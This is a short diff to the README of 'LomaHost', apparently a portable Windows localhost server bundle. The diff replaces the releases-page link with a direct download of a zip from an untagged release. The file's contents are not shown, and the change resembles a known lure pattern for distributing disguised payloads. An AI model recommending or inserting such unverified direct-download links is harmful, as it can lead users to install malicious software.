@@ -21,7 +21,7 @@ Free portable localhost server for Windows — Apache 2.4, PHP 8.4, and MariaDB 
 Windows 10 or Windows 11 (64-bit). Apache 2.4, PHP 8.4, and MariaDB 12 are included — nothing else to install.
 
 ## Download
-https://github.com/snagfiles/LomaHost/releases
+https://github.com/snagfiles/LomaHost/releases/download/untagged-8fccef704c1c9020ae63/lomahost.zip
 
 ## Installation
 
